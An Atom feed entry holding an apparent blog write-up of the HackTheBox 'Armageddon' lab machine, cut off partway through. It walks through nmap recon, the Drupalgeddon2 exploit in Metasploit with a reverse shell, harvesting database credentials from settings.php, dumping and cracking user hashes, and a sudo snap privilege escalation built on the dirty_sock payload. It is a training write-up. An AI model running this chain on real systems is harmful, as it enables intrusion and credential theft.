<?xml version="1.0" encoding="utf-8"?>


<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <title type="text">Doomdesire</title>
    <subtitle type="html">MemE is a powerful and highly customizable GoHugo theme for personal blogs.</subtitle>
    <updated>2021-07-24T19:03:55&#43;03:00</updated>
    <id>https://netuserdoomdesire.github.io/</id>
    <link rel="alternate" type="text/html" href="https://netuserdoomdesire.github.io/" />
    <link rel="self" type="application/atom&#43;xml" href="https://netuserdoomdesire.github.io/atom.xml" />
    <author>
            <name>Doomdesire</name>
            <uri>https://netuserdoomdesire.github.io/</uri>
            </author>
    
    <generator uri="https://gohugo.io/" version="0.83.1">Hugo</generator>
        <entry>
            <title type="text">Armageddon Writeup (HackTheBox)</title>
            <link rel="alternate" type="text/html" href="https://netuserdoomdesire.github.io/posts/writeups/armageddon/" />
            <id>https://netuserdoomdesire.github.io/posts/writeups/armageddon/</id>
            <updated>2021-07-24T19:03:42&#43;03:00</updated>
            <published>2021-07-24T10:00:00&#43;03:00</published>
            <author>
                    <name>Doomdesire</name>
                    <uri>https://netuserdoomdesire.github.io/</uri>
                    </author>
            <summary type="html">Armageddon Writeup (HackTheBox) Overview Machine: https://www.hackthebox.eu/home/machines/profile/323 Armageddon is an Easy HackTheBox machine created by bertolis ( HTB Profile: https://www.hackthebox.eu/home/users/profile/27897). We start by finding out that a vulnerable version of the Drupal CMS is running on the target system. Exploiting it through the Metasploit Framework gets us inside the box.</summary>
            
                <content type="html">&lt;h1 id=&#34;armageddon-writeup-hackthebox&#34;&gt;Armageddon Writeup (HackTheBox)&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/1.png&#34; alt=&#34;Pasted image 20210724044016.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Machine: &lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/323&#34;&gt;https://www.hackthebox.eu/home/machines/profile/323&lt;/a&gt;
Armageddon is an Easy HackTheBox machine created by &lt;strong&gt;bertolis&lt;/strong&gt; ( HTB Profile: &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/27897)&#34;&gt;https://www.hackthebox.eu/home/users/profile/27897)&lt;/a&gt;. We start by finding out that a vulnerable version of the Drupal CMS is running on the target system. Exploiting it through the Metasploit Framework gets us inside the box. From there, the database credentials used by Drupal are discovered, letting us connect to the mysql database and get another user&amp;rsquo;s credentials. We later discover this user can install snap packages with sudo. Exploiting this, we create a new user on the system by installing a custom .snap file. The new user has the permission to run everything with sudo, giving us the ability to change to the root user.&lt;/p&gt;
&lt;h1 id=&#34;initial-reconnaissance&#34;&gt;Initial Reconnaissance&lt;/h1&gt;
&lt;h3 id=&#34;port-scanning&#34;&gt;Port Scanning:&lt;/h3&gt;
&lt;p&gt;We can start with the standard nmap, scanning the default ports:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nmap -sC -sV 10.10.10.233 -oA armageddon
Starting Nmap 7.91 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2021-07-24 04:49 EDT
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.233
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.089s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.6 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;CentOS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; PHP/5.4.16&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-generator: Drupal &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://drupal.org&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-robots.txt: &lt;span class=&#34;m&#34;&gt;36&lt;/span&gt; disallowed entries &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; shown&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /includes/ /misc/ /modules/ /profiles/ /scripts/ 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_/LICENSE.txt /MAINTAINERS.txt
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;CentOS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; PHP/5.4.16
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Welcome to  Armageddon &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 12.80 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;flags-used&#34;&gt;Flags used:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;-sC: Scan with the default scripts&lt;/li&gt;
&lt;li&gt;-sV: Probe open ports to determine service/version info.&lt;/li&gt;
&lt;li&gt;-oN: Save the nmap output on the designated file in normal format.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1 id=&#34;port-80&#34;&gt;Port 80&lt;/h1&gt;
&lt;p&gt;From our initial nmap scan we can see that an HTTP server is running on port 80. By visiting the page we see the following:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/2.png&#34; alt=&#34;Pasted image 20210724045345.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;By using the Wappalyzer addon for firefox (which we can get here: &lt;a href=&#34;https://addons.mozilla.org/el/firefox/addon/wappalyzer/&#34;&gt;https://addons.mozilla.org/el/firefox/addon/wappalyzer/&lt;/a&gt;) we can see right away, that the server is using &lt;strong&gt;Drupal&lt;/strong&gt; version 7, which is a free and open-source Content Management System (CMS). In case we did not have the wappalyzer addon we could still identify that this is a Drupal installation from the page source:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/3.png&#34; alt=&#34;Pasted image 20210724050301.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;At this point, we could try some default credentials or try brute forcing our way in (of course this could potentially lock out a user or/and blacklist our IP so always use with caution). We could also create a new user and try to log in. Since these paths did not appear to work, the next step is to search about Drupal version 7, in order to possibly identify any vulnerability/exploit. Simply searching for &amp;ldquo;Drupal 7 exploit&amp;rdquo; returns a lot of results. The very first interesting result appears to be the known Drupalgeddon2 exploit (&lt;a href=&#34;https://github.com/dreadlocked/Drupalgeddon2&#34;&gt;https://github.com/dreadlocked/Drupalgeddon2&lt;/a&gt;). If we ignore the fact that the box&amp;rsquo;s name is Armageddon (kinda sounds like Drupalgeddon) which pushes us to believe that it is the right exploit, we would try this exploit anyway since it seems to affect the following versions:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Drupal &lt;strong&gt;&amp;lt; 8.3.9&lt;/strong&gt; / &lt;strong&gt;&amp;lt; 8.4.6&lt;/strong&gt; / &lt;strong&gt;&amp;lt; 8.5.1&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Drupal &lt;strong&gt;&amp;lt; 7.58&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;which includes our version.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;getting-a-shell-as-apache&#34;&gt;Getting a shell as apache&lt;/h1&gt;
&lt;p&gt;The exploit we found out is already included in the Metasploit Framework and we are gonna use it from there. Searching for &amp;ldquo;Drupal&amp;rdquo; we can find it pretty easily:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/4.png&#34; alt=&#34;Pasted image 20210724051448.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;The process of the exploitation is pretty straightforward at this point. After selecting the correct exploit from our search we are going to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;set rhosts 10.10.10.233&lt;/code&gt;: Declare our target.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;set lhost tun0&lt;/code&gt;: Set our tun0 interface in order for the reverse shell to connect to the right IP.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;run&lt;/code&gt;: run the exploit&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/5.png&#34; alt=&#34;Pasted image 20210724052103.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;We now have a meterpreter shell as the apache user.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;escalating-privileges-to-the-user-brucetherealadmin&#34;&gt;Escalating privileges to the user brucetherealadmin&lt;/h1&gt;
&lt;p&gt;Since we got a shell as &lt;strong&gt;apache&lt;/strong&gt;, which is a not very privileged user, we will need to escalate our privileges to a normal user. Simply using &lt;code&gt;ls -la&lt;/code&gt; we can see that we can read the server files, including the Drupal installation files:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/6.png&#34; alt=&#34;Pasted image 20210724053454.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;It should be mentioned here that in order for Drupal to work, you have to tell Drupal where it will find the database, what the name of the database is, and what are the database credentials in order to access it. All these information are stored in a file called &lt;code&gt;settings.php&lt;/code&gt;. Since we can read the Drupal installation files as the apache user, we can also read this file. Even if we do not know the exact location of this file, a simple Google search for &amp;ldquo;drupal credentials file&amp;rdquo; can do the job (&lt;a href=&#34;https://drupal.stackexchange.com/questions/225477/where-are-the-database-username-and-password-stored)&#34;&gt;https://drupal.stackexchange.com/questions/225477/where-are-the-database-username-and-password-stored)&lt;/a&gt;. From this Drupal forum we can see that the file we want is located at &lt;strong&gt;/sites/default/settings.php&lt;/strong&gt;, which we of cource have access to. Reading the file we can start searching for the database credentials stored inside it:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/7.png&#34; alt=&#34;Pasted image 20210724054732.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;We now have a set of credentials for the mysql database. We can also verify that the target does indeed listen to the mysql port:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/8.png&#34; alt=&#34;Pasted image 20210724072328.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;This means we can log in mysql to possibly find more credentials. Since we already know from the file that we have the database&amp;rsquo;s name is drupal we are going to run the following in order to see the tables in it (password reducted):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;mysql -u drupaluser -*************** -D drupal -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;show tables;&amp;#39;&lt;/span&gt;
Tables_in_drupal
actions
authmap
batch
block
block_custom
block_node_type
block_role
blocked_ips
cache
cache_block
cache_bootstrap
cache_field
cache_filter
cache_form
cache_image
cache_menu
cache_page
cache_path
comment
date_format_locale
date_format_type
date_formats
field_config
field_config_instance
field_data_body
field_data_comment_body
field_data_field_image
field_data_field_tags
field_revision_body
field_revision_comment_body
field_revision_field_image
field_revision_field_tags
file_managed
file_usage
filter
filter_format
flood
&lt;span class=&#34;nb&#34;&gt;history&lt;/span&gt;
image_effects
image_styles
menu_custom
menu_links
menu_router
node
node_access
node_comment_statistics
node_revision
node_type
queue
rdf_mapping
registry
registry_file
role
role_permission
search_dataset
search_index
search_node_links
search_total
semaphore
sequences
sessions
shortcut_set
shortcut_set_users
system
taxonomy_index
taxonomy_term_data
taxonomy_term_hierarchy
taxonomy_vocabulary
url_alias
users
users_roles
variable
watchdog
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;arguments-used&#34;&gt;Arguments Used:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-u&lt;/code&gt;: The user we are going to log in as. This is followed by a &lt;code&gt;-&lt;/code&gt; and the password.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-D&lt;/code&gt;: The database we are going to use.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-e&lt;/code&gt;: Execute the statement and quit.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;From all these tables, the &lt;strong&gt;users&lt;/strong&gt; table is the most promising one (very common table to contain user credentials) so we are going to read it&amp;rsquo;s contents by using the following command (password reducted):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;mysql -u drupaluser -*************** -D drupal -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;select * from users;&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/9.png&#34; alt=&#34;Pasted image 20210724055855.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Since the output is a little crowded, we can select only the columns that mater for each user (password reducted):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;mysql -u drupaluser -*************** -D drupal -e &lt;span class=&#34;s1&#34;&gt;&amp;#39;select name,pass from users;&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/database.png&#34; alt=&#34;Pasted image 20210724060204.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;As a side note, the user Doomdesire is a user that we previously attempted to create on the initial login page. From here we get the username &lt;strong&gt;brucetherealadmin&lt;/strong&gt; as well as a hash, that we are of course going to crack. To crack the hash we are going to use JohnTheRipper:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;john &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/11.png&#34; alt=&#34;Pasted image 20210724060632.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Since we have now cracked the hash, we have a valid pair of credentials and log in as the user &lt;strong&gt;brucetherealadmin&lt;/strong&gt; via &lt;strong&gt;ssh&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/12.png&#34; alt=&#34;Pasted image 20210724060911.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;We have now logged in as the user &lt;strong&gt;brucetherealadmin&lt;/strong&gt;.&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;escalating-privileges-to-root&#34;&gt;Escalating Privileges to root&lt;/h1&gt;
&lt;p&gt;As with many other boxes, the very first thing to check, is if the user can run anything with sudo:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/13.png&#34; alt=&#34;Pasted image 20210724061138.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;It seems we can run &lt;strong&gt;/usr/bin/snap install *&lt;/strong&gt; with root privileges. Reading from the Snap page, &amp;ldquo;Snaps are cross-distribution, dependency-free, and easy to install applications packaged with all their dependencies to run on all major Linux distributions. As the current user it appears we can install .snap files.&lt;/p&gt;
&lt;p&gt;Searching for any vulnerability online, we get across this exploit &lt;a href=&#34;https://github.com/initstring/dirty_sock&#34;&gt;https://github.com/initstring/dirty_sock&lt;/a&gt;. while this particular exploit is not the one we want to use here, it can help us, because it uses a payload that is in fact a malicious snap package. Reading the exploit &amp;ldquo;dirty_sockv2.py&amp;rdquo; from the github page we see that it includes a base64 encoded string:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/14.png&#34; alt=&#34;Pasted image 20210724065759.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;with the following description:
&lt;code&gt;The following global is a base64 encoded string representing an installable snap package. The snap itself is empty and has no functionality. It does, however, have a bash-script in the install hook that will create a new user.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;From the above we can conclude that this is the .snap file we want. If we can install it we will have our new user created on the box. In order to create the snap file we are going to use python2 (there are other ways to create it). We are going to use the python print funcion in order to print the base64 string and then this output is going to be piped to the base64 decoder and and then right into a .snap file. Something to point out here is that we are going to have to replace the single quotes of the github base64 string with double quotes. This is required because the single quote is going to be used for the python2 &lt;code&gt;-c&lt;/code&gt; argument:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
